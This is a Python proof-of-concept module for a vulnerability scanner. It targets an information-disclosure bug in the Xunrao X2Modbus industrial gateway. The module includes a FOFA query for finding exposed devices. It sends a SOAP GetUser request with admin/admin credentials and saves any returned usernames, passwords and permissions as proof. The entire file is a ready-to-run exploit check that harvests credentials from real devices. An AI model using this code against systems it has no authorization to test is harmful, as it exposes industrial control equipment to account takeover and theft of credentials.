#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/yZ7Wu7_yafLjQd7ZfB4emQ',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '迅饶科技 X2Modbus 网关 GetUser 信息泄露',

      'level'     :   'high',

      'FOFA'      :   'server="SunFull-Webs"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/11',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'zh-CN,zh;q=0.9',
      'Connection': 'close',
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/soap/GetUser'
  body = '<GetUser><User Name="admin" Password="admin"/></GetUser>'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=body,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'<UserName>.*?</UserName>.*?</PassWord>.*?<Purview>',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret